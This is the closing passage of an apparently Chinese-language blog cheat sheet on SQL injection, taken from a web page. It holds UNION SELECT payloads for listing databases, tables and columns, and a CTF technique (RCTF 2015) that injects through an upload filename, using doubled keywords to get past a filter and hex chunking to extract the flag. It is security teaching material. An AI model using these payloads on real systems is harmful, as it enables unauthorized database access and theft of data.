<h3 id="5、常用"><a href="#5、常用" class="headerlink" title="5、常用"></a>5、常用</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,1,database() #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() #</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,1,group_concat(column_name) from information_schema.column where tabele_name=&#x27;</span> xxx<span class="string">&#x27; #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,xx <span class="keyword">from</span> xxxx.xxx # </span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line"><span class="number">1</span><span class="string">&#x27;union select 1,1,group_concat(xx) from xxx #</span></span><br></pre></td></tr></table></figure>

<h3 id="6、SQL与文件上传"><a href="#6、SQL与文件上传" class="headerlink" title="6、SQL与文件上传"></a>6、SQL与文件上传</h3><p>典型的2015RCTF题型 打着文件上传的幌子，实际上是SQL注入，注入方式也很特别，所以当我们拿到文件上传想关题目，什么姿势都试过了，却拿不到flag，这个时候可以换个方式，找找注入点，一般注入点在filename,payload如下:</p>
<h4 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>)</span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),25,12),16,10))+&#x27;</span>.jpg</span><br></pre></td></tr></table></figure>

<h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br></pre></td></tr></table></figure>

<h4 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#x27;</span>.jpg</span><br></pre></td></tr></table></figure>

<p>类似于这样的题目都是骚题目，所以flag肯定不会一下就出来，每次只会 出来一部分，所以需要我们迂回注入<br>即为修改一下substr的起始位置参数，看看后边还有没有<br>当然根据情况而定，如果一次性爆出来就不需要迂回了</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2020/07/02/File-Parsing-Vulnerabilities/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2024-04-21 02:20:17
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/Vulnerabilities/" title="Vulnerabilities">
                        #Vulnerabilities
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2020/07/06/CVE-2020-5902/" target="_self">
                <span>Next</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#False%E6%B3%A8%E5%85%A5"><span class="toc-text">False注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">适用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E9%9A%90%E5%BC%8F%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AC%E6%8D%A2"><span class="toc-text">mysql隐式类型的转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%8C%87%E5%AE%9A%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">过滤指定的字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1%E3%80%81%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97"><span class="toc-text">1.1、算术运算</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2%E3%80%81-%E4%BD%8D%E6%93%8D%E4%BD%9C%E8%BF%90%E7%AE%97"><span class="toc-text">1.2、 位操作运算</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3%E3%80%81-%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">1.3、 比较运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4%E3%80%81-%E5%85%B6%E4%BB%96"><span class="toc-text">1.4、 其他</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-text">1.5 综合利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6%E3%80%81%E7%BB%93%E5%90%88%E7%9B%B2%E6%B3%A8"><span class="toc-text">1.6、结合盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90"><span class="toc-text">文件操作权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1%E3%80%81%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-text">2.1、读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2%E3%80%81%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">2.2、写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4%E3%80%81%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="toc-text">2.4、正则绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6%E3%80%81%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="toc-text">2.6、特殊字符绕过空格</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%9C%AA%E7%9F%A5%E5%AD%97%E6%AE%B5%E5%90%8D%E7%9A%84%E6%8A%80%E5%B7%A7"><span class="toc-text">绕过未知字段名的技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Join%E6%9F%A5%E8%AF%A2"><span class="toc-text">使用Join查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB"><span class="toc-text">Mysql约束攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IN"><span class="toc-text">IN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Between"><span class="toc-text">Between</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%97%E5%90%8D%E8%A2%ABban%EF%BC%8C%E8%87%AA%E5%B7%B1%E6%9E%84%E9%80%A0"><span class="toc-text">列名被ban，自己构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#limit%E4%B8%8B%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0%E5%88%A4%E6%96%AD"><span class="toc-text">limit下的字段数判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BENCHMARK"><span class="toc-text">BENCHMARK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4"><span class="toc-text">绕过 \&#39; 过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8"><span class="toc-text">Mysql字符编码利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5%E6%B3%A8%E5%85%A5"><span class="toc-text">md5注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Update-%E5%92%8C-Insert%E6%B3%A8%E5%85%A5"><span class="toc-text">Update 和 Insert注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E5%90%8E%E6%9E%84%E9%80%A0"><span class="toc-text">闭合后构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E9%94%99%E8%AF%AF"><span class="toc-text">构造错误</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNSLOG%E6%B3%A8%E5%85%A5"><span class="toc-text">DNSLOG注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-WAF"><span class="toc-text">Bypass WAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#innodb"><span class="toc-text">innodb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys"><span class="toc-text">sys</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="toc-text">报错盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7"><span class="toc-text">过滤逗号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E8%BF%87%E6%BB%A4and-or"><span class="toc-text">数字型过滤and or</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0information-schema%E6%89%BE%E8%A1%A8%E5%90%8D%E7%9A%84%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%B3%95"><span class="toc-text">无information_schema找表名的替代方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%88%97%E5%90%8D%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE"><span class="toc-text">在没有列名的情况下检索数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7"><span class="toc-text">奇淫技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-text">1、过滤的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%8A%80%E5%B7%A7"><span class="toc-text">2、技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1%E3%80%81like"><span class="toc-text">2.1、like</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2%E3%80%81Limt"><span class="toc-text">2.2、Limt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3%E3%80%81order-by"><span class="toc-text">2.3、order by</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%9C%89%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">3、有关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E4%B8%8D%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%BB%A4"><span class="toc-text">3.1 不常用函数绕过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%90%9C%E7%B4%A2%E5%8C%B9%E9%85%8D%E7%B1%BB%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">3.2 搜索匹配类的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3%E3%80%81%E4%B8%80%E4%BA%9B%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0"><span class="toc-text">3.3、一些数学函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4%E3%80%81%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%88%87%E5%89%B2"><span class="toc-text">3.4、使用函数进行字符串的切割</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5"><span class="toc-text">3.5、字符串连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%85%B3%E4%BA%8Ephp%E4%B8%ADmd5%E7%9A%84%E4%B8%80%E4%B8%AA%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-text">4 关于php中md5的一个有意思的小技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E5%B8%B8%E7%94%A8"><span class="toc-text">5、常用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81SQL%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">6、SQL与文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%BA%93%EF%BC%9A"><span class="toc-text">爆库：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D%EF%BC%9A"><span class="toc-text">爆表名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-text">爆列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%80%BC"><span class="toc-text">爆值</span></a></li></ol></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/L0kiii">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        Copyright © 2024
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Summary%20of%20SQL%20Injection + '&url=' + https%3A%2F%2Fl0ki.net%2F2020%2F07%2F03%2FComprehensive-SQL-Injection-Summary%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://l0ki.net/2020/07/03/Comprehensive-SQL-Injection-Summary/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body>
</html>
